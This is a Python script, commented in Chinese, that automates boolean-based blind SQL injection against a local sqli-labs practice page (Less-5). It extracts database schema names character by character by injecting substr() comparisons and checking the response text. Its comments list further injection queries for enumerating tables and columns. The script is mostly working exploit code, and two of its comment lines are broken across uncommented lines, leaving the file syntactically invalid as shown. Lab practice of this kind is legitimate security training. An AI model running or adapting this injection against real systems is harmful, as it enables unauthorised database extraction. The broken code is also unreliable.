

```python
#coding=utf-8
#确定字符编码为utf-8
# python3
# author: leticia
#导入request模块
import requests

#用这里的语句分别替换id中的内容即可爆库、表、字段
#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
#select group_concat(TABLE_NAME) from information_schema.TABLES 
where TABLE_SCHEMA = 'xxx'
#select group_concat(COLUMN_NAME) from information_schema.COLUMNS 
where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'

#用于匹配的字符串
#dic1=' "?/+=~.,@#$%^&*()QWERTYUIOPASDFGHJKLZXCVBNM'
dic='0123456789abcdefghijklmnopqrstuvwxyz_,'

#请求的url
url='http://127.0.0.1/sql-labs/Less-5?id=1\' and '
string=''
for i in range(1,100):
    for j in dic:

##################################################################################
        id="substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),{0},1)={1}--+".format(str(i),ascii(j))
        #print(id)

        #最后请求的url=url+id
        url_get=(url+id)
        #print(url_get)
        r=requests.get(url_get)

########################################################################################
        #如果response中含有You则输出匹配到的字符
        if "You" in r.text:
            string+=j
            print(string)
print(string)
```

